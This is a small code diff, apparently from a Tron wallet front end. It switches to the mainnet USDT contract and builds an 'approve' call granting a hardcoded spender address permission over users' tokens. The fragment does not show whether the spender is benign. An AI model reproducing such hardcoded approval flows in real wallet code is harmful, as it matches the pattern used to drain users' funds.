@@ -71,8 +71,9 @@
           return;
         }
 
-        const contract = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        const spenderHex = "419e6140a7e76e3790ef5e18c028f685e2d46bb4ee"; // hex 格式 spender 地址
+        const contract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 主网 USDT 合约地址
+        const spenderHex = "41b4428a48e7ecbe6e4a498fb2c11e9e011f094f1f"; // 主网授权地址 (示例，实际替换)
+
         const tx = await wallet.transactionBuilder.triggerSmartContract(
           contract,
           "approve(address,uint256)",
